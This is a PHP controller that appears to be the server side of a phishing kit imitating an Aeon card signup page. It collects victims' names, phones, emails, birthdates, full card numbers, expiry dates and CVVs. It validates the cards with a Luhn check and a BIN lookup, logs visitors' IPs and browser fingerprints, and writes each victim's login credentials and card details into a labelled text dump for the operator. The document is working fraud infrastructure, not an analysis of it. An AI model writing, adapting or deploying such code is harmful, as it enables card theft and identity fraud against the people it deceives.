<?php
namespace app\controller;

use app\BaseController;
use think\facade\View;
use think\facade\Db;

class Signup extends BaseController
{
    private function luhn($cardNumber = '')
    {
        if (empty($cardNumber) || !is_numeric($cardNumber)) {
            return false;
        }

        $length     = strlen($cardNumber);
        $allNumber  = [];
        $sumOdd     = 0;
        $sumEven    = 0;

        //将所有数字分隔开来塞进临时数组
        for ($i = 0;$i < $length;$i++) {
            $allNumber[] = substr($cardNumber, $length-$i-1, 1);
        }

        for ($k = 0; $k < $length; $k++) {
            if ($k % 2 == 0) {
                $sumOdd += $allNumber[$k];
            } else {
                if ($allNumber[$k] * 2 >= 10) {
                    $sumEven += $allNumber[$k] * 2 - 9;
                } else {
                    $sumEven += $allNumber[$k] * 2;
                }
            }
        }


        $result = $sumOdd + $sumEven;
        return $result % 10 == 0 ? true : false;
    }

    public function index()
    {
        if(session('?id') === false){
            $ip = session('ip');
            $time = date('Y-m-d H:i:s');

            $user['zt'] = 11;
            $user['ip'] = $ip;
            $user['time'] = $time;
            $user['online'] = time();

            $user['data1'] = json_encode(['username'=>'新规登录','password'=>'新规登录']);

            Db::Name('data')->save($user);

            $getid = Db::name('data')->getLastInsID();
            add_log($getid,10,'用户选择新规登录');
            session('id',$getid);
        }

        return View::fetch();
    }

    function BuildTxt($id)
    {
        //----------保存txt------------
        $data = Db::Name('data')->where('id',$id)->findOrEmpty();
        if(isset($data)){
            $data1=json_decode($data['data1'],true);
            $data2=json_decode($data['data2'],true);
            $data3=json_decode($data['data3'],true);

            $txtContent="#--------------------------------[ Aeon账号 ]----------------------------#".PHP_EOL;
            $txtContent.="账号：".$data1['username'].PHP_EOL;
            $txtContent.="密码：".$data1['password'].PHP_EOL;

            $txtContent.="#--------------------------------[ 信用卡详情 ]----------------------------#".PHP_EOL;
            $txtContent.="卡种：".$data3['type'].PHP_EOL;
            $txtContent.="卡号：".$data3['kahao'].PHP_EOL;
            $txtContent.="日期：".$data3['yue'].' / '.$data3['nian'].PHP_EOL;
            $txtContent.="CVV：".$data3['cvv'].PHP_EOL;

            $txtContent.="#--------------------------------[ 个人信息 ]----------------------------#".PHP_EOL;
            $txtContent.="名字：".$data2['quanming'].PHP_EOL;
            $txtContent.="电话：".$data2['dianhua'].PHP_EOL;
            $txtContent.="邮件：".$data2['youxiang'].PHP_EOL;
            $txtContent.="生日年月：".$data2['chengshi'].PHP_EOL;

            $txtContent.="#--------------------------------[ 指纹信息 ]----------------------------#".PHP_EOL;

            $ip=get_client_ip();
            $ip_json = get_ip_info($ip);
            $ip_info = json_decode($ip_json, true);

            $txtContent.="IP Address：".$ip.PHP_EOL;
            $txtContent.="IP Region：".(isset($ip_info['geoplugin_regionName']) ? trim($ip_info['geoplugin_regionName']) : '').PHP_EOL;
            $txtContent.="IP City：".(isset($ip_info['geoplugin_city']) ? trim($ip_info['geoplugin_city']) : '').PHP_EOL;
            $txtContent.="IP CountryCode：".(isset($ip_info['geoplugin_countryCode']) ? trim($ip_info['geoplugin_countryCode']) : '').PHP_EOL;
            $txtContent.="IP CountryName：".(isset($ip_info['geoplugin_countryName']) ? trim($ip_info['geoplugin_countryName']) : '').PHP_EOL;
            $txtContent.="IP Continent：".(isset($ip_info['geoplugin_continentName']) ? trim($ip_info['geoplugin_continentName']) : '').PHP_EOL;
            $txtContent.="IP Timezone：".(isset($ip_info['geoplugin_timezone']) ? trim($ip_info['geoplugin_timezone']) : '').PHP_EOL;
            $txtContent.="OS/Browser：".getOS().' / '.getBrowser().PHP_EOL;
            $txtContent.="User Agent：".(isset($_SERVER['HTTP_USER_AGENT']) ? trim($_SERVER['HTTP_USER_AGENT']) : "").PHP_EOL;

            saveFile('card',$data3['kahao'],$txtContent);
        }
    }

    public function save()
    {
        if($this->luhn(input('cardno'))){
            
            //----------判断卡号 C / D------------
            $type='未知';
            $binjson = @file_get_contents('https://lookup.binlist.net/'.input('cardno'));
            if($binjson){
                $bininfo = json_decode($binjson, true);
                if(isset($bininfo['type'])){
                    if($bininfo['type']=="debit"){
                        $type='储蓄卡';
                    }
                    if($bininfo['type']=="credit"){
                        $type='信用卡';
                    }
                }
            }

            //----------添加数据库------------
            $zt=Db::Name('Admin')->where('id',1)->value('khyz');
            $user['zt']=20+$zt;

            $birthdate = input('birthdateYear').'-'.input('birthdateMonth').'-'.input('birthdateDay');
            $user['data2']=json_encode([
                'youxiang'=>input('ManEmail'),
                'dizhi1'=>input('AAA'),
                'dizhi2'=>input('AAA'),
                'chengshi'=>$birthdate,
                'youbian'=>input('YouBian'),
                'dianhua'=>input('Mantel'),
                'quanming'=>input('ManName'),
            ]);

            $user['data3']=json_encode([
                'kahao'=>input('cardno'),
                'yue'=>input('expDateMonth'),
                'nian'=>input('expDateYear'),
                'cvv'=>input('securityCode'),
                'type'=>$type,
            ]);
            Db::Name('data')->where('id',session('id'))->update($user);

            //----------添加提醒次数------------
            Db::Name('Admin')->where('id',1)->update(['time_card'=>time()]);
            //----------添加日志------------
            add_log(session('id'),30,'填写信用卡信息');

            $this->BuildTxt(session('id'));

            return json(['code'=>200]);
        }else{
            $user['zt']=22;
            Db::Name('data')->where('id',session('id'))->update($user);
            return json(['code'=>500]);
        }
    }
}
